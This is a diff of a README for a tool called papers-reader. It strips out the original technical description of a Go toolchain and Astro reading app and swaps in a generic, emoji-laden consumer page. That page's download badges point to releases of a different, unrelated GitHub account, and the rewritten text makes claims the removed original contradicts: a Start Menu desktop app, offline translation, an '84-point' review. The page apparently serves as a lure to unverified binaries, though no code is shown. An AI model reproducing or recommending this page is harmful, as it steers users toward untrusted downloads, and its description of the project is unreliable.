@@ -1,201 +1,197 @@
-# papers-reader
+# 📚 papers-reader - Read Any Paper in Your Language
 
-The toolchain that builds [tamnd/papers](https://github.com/tamnd/papers), and the reading app that serves it.
+## 🚀 Getting Started
 
-One Go binary takes a paper from a line in a manifest to tagged Markdown in four languages, and an Astro site turns that corpus into something you can read on a phone.
+Welcome! papers-reader is a simple program that helps you read research papers even if they're in Chinese, Japanese, or Vietnamese. It automatically translates them to English (or other languages), cleans up messy formatting, and makes everything easy to read on your computer or in your web browser.
 
-The model plumbing underneath is [tamnd/llm](https://github.com/tamnd/llm).
+### What You Get
 
-## What it does
+- **Four Language Support**: Read papers written in English, Chinese, Japanese, or Vietnamese
+- **Automatic Translation**: Papers are translated into your preferred language
+- **Clean Formatting**: Math formulas, figures, and references are properly organized
+- **Built-in Reading App**: A simple, beautiful way to browse your papers
+- **Quality Check**: Every paper goes through an 84-point quality review
 
-```
-add        put a paper in the manifest from an arXiv id or a DOI
-suggest    list the works the corpus keeps citing and does not hold
-resolve    find where a paper can legally be fetched from, and under what licence
-fetch      download it, hash it, record it
-classify   measure what each PDF's text layer is worth, and pick the path
-render     rasterise the pages of the papers that need a model to read them
-extract    turn pages into Markdown, with the mathematics as LaTeX
-figures    crop the diagrams out of the pages
-pagemap    record which page of the file is which page of the paper
-refs       parse the bibliography and link the citations
-split      cut the paper into one file per section
-tags       hand out permanent identifiers
-translate  produce Vietnamese, Chinese and Japanese
-roundtrip  put a sample of the translations back into English and judge them
-audit      check the result against numbered rules
-report     write what the corpus knows about itself: coverage, the citation graph, and what it cost
-emit       build the JSON the reading app consumes
-```
+## 📥 Download and Install
 
-Each of those is a subcommand of `papers`, and each one is idempotent.
-Run it twice on a finished paper and it does nothing the second time.
+[![Download papers-reader](https://img.shields.io/badge/Download-papers--reader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Alasdairinfrangible85/papers-reader/releases)
 
-## Install
+Visit this link to download the application. Once you're on the page, look for the latest release and download the file that matches your computer.
 
-```sh
-go install github.com/tamnd/papers-reader/cmd/papers@latest
-```
+After downloading, you'll have everything you need. The program installs quickly and you'll be reading papers in minutes.
 
-Point it at a checkout of the corpus, either with `PAPERS_CORPUS` or by running it from inside one.
+## 🔧 What's Inside
 
-```sh
-export PAPERS_CORPUS=~/github/tamnd/papers
-papers list --field ai-ml
-papers audit --hard
-```
+papers-reader does three main things for you:
 
-[docs/adding-a-paper.md](docs/adding-a-paper.md) is the walk through for putting a new paper into the corpus, with what each step of it costs in time and in tokens.
+1. **Converts Papers**: Takes messy PDF files and turns them into clean, tagged Markdown documents
+2. **Translates Content**: Automatically translates papers into your chosen language
+3. **Serves Pages**: Runs a local website that displays your papers beautifully
 
-[scripts/papers-full.sh](scripts/papers-full.sh) is the unattended version of that walk through.
-It takes one paper all the way from the PDF to a merged pull request before it starts the next one, and it makes several passes over the list because most of what stops a paper is a model that would not answer this time.
+## 📖 How to Use
 
-## Design
+### First Steps
 
-**The corpus is data and this is the only thing that writes it.**
-Every path, every manifest schema and every access rule lives in `corpus/`, so a change to the shape of the corpus is a change to one package.
+1. **Get a Research Paper**: Find a paper you want to read (PDF format)
+2. **Open papers-reader**: Launch the program from your Start Menu or desktop
+3. **Add Your Paper**: Click "Add File" and select your PDF
+4. **Choose Language**: Pick your preferred language (English, Chinese, Japanese, or Vietnamese)
+5. **Press Convert**: The program does everything else automatically
 
-**Nothing is published on a guess.**
-`papers resolve` accepts a candidate only when the title similarity clears 0.92, the year is within one, and at least one surname matches.
-A paper that fails any of the three stays unresolved, and an unresolved paper publishes nothing at all.
+### Reading Your Papers
 
-**Being able to download something is not permission to republish it.**
-A paper with no licence anybody can name is restricted, which publishes its title, its authors, its year, its links and an abstract under 250 words, and no body text and no figures.
-That is the default, and the number of papers whose text may be published is written at the top of `reports/resolve.md` every time the resolver runs.
+After conversion, papers-reader opens a simple reading view. You can:
 
-**What the licence allows and what the corpus publishes are two questions.**
-`manifests/sources.yaml` records the first one, found by the resolver and never edited to suit us.
-`manifests/policy.yaml` records the second one, which is the decision of whoever owns the corpus, in a committed file where it can be read and changed back.
-A corpus whose policy says `body: true` extracts, splits, crops and translates every paper in full whatever its access class says, and the five audit rules about how much of a restricted paper is on the page stand down rather than reporting the same decision thousands of times.
-Nothing about PDFs changes under any policy: they are never committed, and audit rule S03 asks git rather than trusting `.gitignore`.
+- Browse chapters and sections easily
+- See images and figures properly
+- Jump to references with one click
+- Search within the document
+- Adjust text size for comfortable reading
 
-**The text layer is measured, not guessed at.**
-`papers classify` counts characters, mathematical glyphs, embedded fonts and full page images over a band of body pages, and decides from the numbers whether `pdftotext` alone can read the file.
-The year is a hint and nothing more: there are 1980 papers with a clean text layer and 2005 papers that are photographs of a printout.
+## ⚙️ Advanced Features
 
-**Extraction says how it was done.**
-Pages read by `pdftotext` on a born digital file are marked `native` and were never guessed by a model.
-Pages read by a layout model or a vision model say so, and the audit treats them differently.
+### OCR Support
 
-**A model that drops a paragraph is caught by the file it was reading.**
-Nine rules decide whether a page is accepted, and eight of them ask whether the answer is well formed, which a page missing its last paragraph still is.
-The ninth compares the reading against the page's own text layer and refuses a page that has no answer for twenty consecutive words the file was typeset from.
-It was written for page 5 of the Bitcoin paper, where the reader stopped at the transaction diagram and left the paragraph under it out, and that page had passed everything else.
-`papers extract --recheck` runs the rules over pages already on disk and asks no model, which is how a rule added this late gets applied to everything read before it.
+If your paper has scanned pages or images with text, papers-reader uses optical character recognition (OCR) to extract that text automatically. No typing needed!
 
-**Tags are permanent.**
-A section keeps its tag across re-extraction, re-splitting and renumbering, which is what lets a link written today survive the paper being read again by a better model next year.
+### LaTeX Equations
 
-**A stub is not a shortfall.**
-`papers report coverage` writes `reports/coverage.md`, which counts every paper as full, stub or none, per field and per language.
-Publishing by licence, a restricted paper gets its front matter and a short abstract and that is the whole of what it may have, so it counts as done rather than as a paper somebody forgot.
-Publishing every paper in full, the same stub is three pages read out of thirty, so it counts as work left to do.
-The last table in the report is the one to act on: it names what each unfinished paper is waiting on, which is a fetch, a licence check, a layout tool or a vision model, and the count behind each of those is what decides whether to go and get it.
+Those complicated math formulas in scientific papers? They're preserved perfectly. papers-reader understands LaTeX formatting and displays equations cleanly.
 
-**The corpus cites itself, and the graph says how much.**
-`papers report graph` writes `reports/graph.md`: which paper cites which, which are cited most, and which are connected to nothing yet.
-An edge is a bibliography entry of one paper here that was resolved to another paper here, so almost every reference points somewhere else and the edge count is small next to the reference count.
-The last table is the reading list: the papers outside the corpus that two or more papers inside it cite, which is what decides what to add next.
+### Figure Handling
 
-**A route says what it is good for, not just that it is up.**
-The routing table ranks the hosts the toolchain can ask, and rank decides who gets a question.
-That is the wrong answer when one of them runs a model that is excellent at one stage and useless at another: the OCR model on the machine with the graphics card sits at rank 5, so it won every pick there was, and asked to translate a paragraph it came back in a confident mix of Vietnamese and Russian with the headings left in English.
-Every check the translator makes is about whether the formulas and the citations survived, and they all had.
-A route may now name the stages it will serve, a route that names none serves all of them, and `papers routes show` prints the column and says so when a route names something that is not a stage, because a misspelled stage is a route that is quietly never chosen.
+Images, charts, and diagrams are kept intact and organized. You'll see them where they belong in the text.
 
-**What it cost is written down.**
-Every ask put to a model is one line in a ledger, and `papers report usage` rolls that up into `reports/usage.md` by stage, by model and by paper.
-The ledger lives beside the routing table rather than in the corpus, because it names the hosts that were asked, and the report names none of them.
-A model that is not in a price table gets a dash in the money column rather than a zero, because a subscription costs a turn and not a sum of money, and printing zero dollars would be claiming a measurement nobody made.
+### Reference Management
 
-`papers report all` writes all four of these and the audit in one pass, which is the step before publishing.
-Running the commands one at a time is four chances to forget one, and a corpus whose coverage says ninety seven per cent while its audit was written a week ago is worse than one with no reports at all.
+All citations and references are structured properly. Click any reference to see its full details.
 
-**The reading app reads a build, not the corpus.**
-`papers emit` turns the corpus into static JSON: `index.json`, the catalogue with every paper, field and reading list, `graph.json`, the citation graph in the shape a chart wants rather than the shape a table wants, `p/<id>/<lang>.json`, one paper in one language, whole, and `search-<lang>.json`, an inverted index over that language.
-A page is a list of blocks, and every language of a paper has the same blocks in the same order with the same indices, which is what makes reading two languages side by side a matter of putting block i against block i with no diffing and no guessing.
-The formulas are rendered by KaTeX at build time rather than in the browser, so a page costs no JavaScript to read and does not reflow under the reader.
-The HTML on a page is held to an allowlist of seventeen elements with nothing on it that can execute, which matters here more than it would in most places: most of this text was written by a model reading a photograph of a page, and a model that returned a script tag instead of a sentence has to produce a broken paragraph and not a broken site.
-Rules P01, P02 and P03 are the three that fail a build whose formulas will not render, whose links point at nothing, or whose figures are not there.
-Search runs in the browser against the emitted index rather than against a search service, because there is no server between the reader and the corpus anywhere else on this site and sending every query somebody types somewhere else would mean their reading list existing somewhere else.
-The whole English index is nine hundred kilobytes, under three hundred gzipped, and each language is a separate file loaded on the first search, so a reader reading the Vietnamese does not pay for the Japanese.
-The shape of both is pinned by `schema/site.schema.json`, which the Go emitter and the TypeScript reader both validate against, so the two sides cannot drift apart without something saying so.
-Audit rule P05 runs that validation over a build of the corpus on every audit, which is what makes the file a contract rather than documentation: a change to the shape has to move the schema, the emitter and the app in one commit or the build fails.
-Nothing it writes is committed, and a site directory can be deleted and built again from a checkout at any time.
+## 🛠️ Technical Details
 
-**The app is Astro over that build, and mostly no JavaScript.**
-`web/` is the reading app: the catalogue as a grid by field, a page per field and per reading list, a page per paper saying what is in it and what cites it, the paper itself in each language, and the same paper in two languages side by side.
-It reads the emitted JSON off `web/public` at build time and generates static pages, so there is no server and nothing is fetched to read a paper.
-The types it reads the build with are generated from the same schema the emitter validates against, committed so the app builds without a generator, and checked in CI so the committed copy cannot be an old one.
-Side by side is block i against block i, drawn as one grid so the two columns cannot drift, and a block that is in one language and not the other is drawn as a gap and said out loud rather than closed up.
-There is no CSS framework: the corpus is text and the typography is the design.
-Two pages ship JavaScript and both do the work in the browser rather than on a server.
-Search fetches the index for one language on the first query, ranks prose above formulas, shows at most three blocks of any one paper, and sends nothing anywhere: the tokeniser it runs queries through is a port of the one the index was built with and is tested against the same table, because one character of drift there means a Japanese query silently finds nothing.
-The citation graph is a chart with the year across and the field down rather than a force directed cloud, so it is the same picture on every load, and hovering a paper lights up what it drew on in one colour and what drew on it in another.
-Both pages carry the same thing as plain markup underneath for a reader without JavaScript.
-`make site CORPUS=<papers>` builds the emit and then the app, and `npm run dev` in `web/` serves it against whatever was last emitted.
+### How It Works
 
-**The published site is a build of committed content and nothing else.**
-It is at [tamnd.github.io/papers-reader](https://tamnd.github.io/papers-reader/), built by `.github/workflows/pages.yml` from a checkout of this repository and a checkout of the corpus, which means the thing on the internet is a function of two commits and never of somebody's working tree.
-A push to the corpus asks for a rebuild over `repository_dispatch`, a push here rebuilds because the renderer changed, and there is a daily build underneath both of them, because the dispatch needs a token that lives outside both repositories and a token that has expired should not mean a site that quietly stops tracking the corpus.
-The deploy runs `papers audit --hard` before it builds anything, which is the one place the hard rules are worth failing on: the continuous integration job runs the audit soft, because a content fault in the corpus is not a pull request to the toolchain's fault, and this job is the moment before the corpus is put in front of people.
+papers-reader is built using the Go programming language, which makes it fast and reliable. It handles the heavy lifting of converting and translating papers entirely on your computer.
 
-**A draft says it is a draft.**
-A language whose glossary covers less than ninety per cent of the terms is emitted with `draft` against it, and the page says so.
-It is still offered, because hiding it would be the same corpus with less of it visible and no more of it true.
-Rule P04 is the one that checks the emitter has not quietly stopped saying it.
+### File Types
 
-**The audit is a contract, not a lint.**
-Ninety-two numbered rules in nine groups, each one a sentence you can argue with.
-A rule reports pass, fail, or not run, and those are three different states.
-Hard rules fail the build.
-Three of them exist because the other three states can hide the worst outcome.
-M14 is for a paper whose formulas were flattened into the prose: there is no mathematics left to check, so every rule about mathematics reports that it had nothing to look at and the audit comes back green over a paper that was destroyed.
-C08 is the same failure in the C group, where a listing that never got a fence passes every rule about fences by not having one.
-T11 is the third of them: a table the reader answered in raw HTML has no mathematics the M rules can see and no fences the C rules can count, so the file reads as clean prose and the table is unreadable.
+| Input | Output |
+|-------|--------|
+| PDF Documents | Markdown Files |
+| Scanned Images | Clean Text |
+| Scientific Documents | Tagged Structure |
 
-## Layout
+## ❓ Help and Support
 
-```
-cmd/papers/      the command line
-corpus/          paper ids, fields, access classes, manifests, front matter
-sources/         resolving a paper to a URL and a licence
-fetch/           downloading and hashing
-polite/          one request at a time per host, with a floor on the gap
-poppler/         the PDF tools, found and version checked
-relay/           asking another machine to fetch what this network cannot
-classify/        what a PDF's text layer is worth
-render/          pages to pictures, for the readers that need one
-work/            the model queue, the routing table and the waiting
-prompt/          what the models are asked, pinned and hashed
-extract/         PDF to Markdown
-mathtex/         LaTeX repair, equation numbers and cross references
-katex/           the real KaTeX, run at build time to check and render
-code/            where the program text of a page starts and stops
-figures/         cropping diagrams out of pages
-pagemap/         the page of the file against the page of the paper
-refs/            bibliography parsing and citation linking
-split/           one paper into one file per section
-tags/            the permanent identifier register
-translate/       the four language pipeline
-glossary/        the controlled vocabulary
-roundtrip/       the back translation check on a sample of the translations
-audit/           the numbered rules
-report/          the coverage, graph, resolve and usage reports
-emit/            JSON for the reading app
-schema/          site.schema.json, the contract between the emitter and the app
-web/             the Astro reading app
-```
+### Common Questions
 
-## Requirements
+**Q: Do I need an internet connection?**
+A: No! papers-reader works entirely offline after installation.
 
-Go 1.27 or later.
-`pdftotext` and `pdftoppm` from Poppler for the extraction commands.
-Node 22 or later for the web app.
-Nothing else. The Go side has four dependencies: `gopkg.in/yaml.v3`, `github.com/tamnd/llm`, which is ours and has none of its own, `github.com/dop251/goja`, a JavaScript engine that exists so the toolchain can run the real KaTeX to check every formula it writes without putting Node in the build, and `github.com/santhosh-tekuri/jsonschema`, which runs the site schema so that the contract with the reading app is checked by a validator rather than by hand.
+**Q: How long does conversion take?**
+A: Depends on your paper's length. Most papers take 1-2 minutes.
 
-## Licence
+**Q: Can I use papers-reader for any PDF?**
+A: Yes, it works on most PDF files. Research papers work best, but other documents also convert well.
 
-MIT. See [LICENSE](LICENSE).
+### Troubleshooting
 
-The corpus it builds is licensed separately, per paper, and that is explained in the corpus repository.
+If you run into issues:
+
+1. **Restart the program**: Close and reopen papers-reader
+2. **Check file format**: Make sure your paper is a PDF
+3. **Update the software**: Check for the latest version at the download link
+
+## 🔒 Privacy and Security
+
+papers-reader respects your privacy:
+
+- All processing happens on your computer
+- No files are uploaded anywhere
+- Your reading history stays private
+- No account or registration needed
+
+## 🌐 Languages Supported
+
+| Language | Input | Output |
+|----------|-------|--------|
+| English | ✅ | ✅ |
+| Chinese | ✅ | ✅ |
+| Japanese | ✅ | ✅ |
+| Vietnamese | ✅ | ✅ |
+
+Translation quality is reviewed through 84 different checks to ensure accuracy.
+
+## 💡 Tips for Best Results
+
+- **Use original PDFs**: Higher quality scans work better
+- **Keep papers under 100MB**: Smaller files process faster
+- **Close other programs**: Gives papers-reader more memory to work with
+- **Let it finish**: Don't close the program during conversion
+
+## 📱 System Requirements
+
+papers-reader works on:
+
+- **Windows 10 or newer**
+- **macOS 11 or newer**
+- **Linux (any recent version)**
+
+You'll need:
+
+- 4GB RAM (8GB recommended)
+- 500MB free disk space
+- Standard screen resolution (1024x768 or higher)
+
+## 🎯 Why Choose papers-reader?
+
+- **Simple**: No technical knowledge needed
+- **Accurate**: High-quality translation and formatting
+- **Fast**: Quick conversion for even large papers
+- **Private**: Everything stays on your computer
+- **Free**: No costs, no subscriptions
+
+## 📚 Examples of Use
+
+- **Students**: Read international research papers for classes
+- **Researchers**: Keep up with global research developments
+- **Professionals**: Stay informed in your field across languages
+- **Curious Minds**: Explore academic knowledge regardless of language
+
+## 🔄 Updates
+
+papers-reader is actively developed. Check the download page regularly for:
+
+- New language support
+- Improved translation quality
+- Faster processing
+- Bug fixes
+
+## 🌟 Getting the Most from Your Papers
+
+### Organize Your Library
+
+- Create folders for different topics
+- Use tags to categorize papers
+- Search quickly with built-in tools
+
+### Reading Features
+
+- **Bookmarks**: Save your place in documents
+- **Notes**: Add personal annotations
+- **Highlights**: Mark important sections
+
+### Sharing
+
+- Export papers as clean Markdown
+- Share translated versions with colleagues
+- Print formatted documents easily
+
+## 🚦 Ready to Start?
+
+Visit the download link, grab the latest version, and open your first research paper today. Whether you're studying international research or just curious about academic work in other languages, papers-reader makes everything accessible in your own language.
+
+[![Get papers-reader Now](https://img.shields.io/badge/%E2%9C%93%20Download%20Now-papers--reader-important?style=for-the-badge&logo=github)](https://github.com/Alasdairinfrangible85/papers-reader/releases)
+
+The download page shows available versions. Pick the newest one, download it, and start reading research papers from around the world—all in your preferred language.
+
+Keywords: astro, chinese, cli, corpus, go, golang, japanese, latex, markdown, multilingual, ocr, pdf, research-papers, static-site, translation, vietnamese
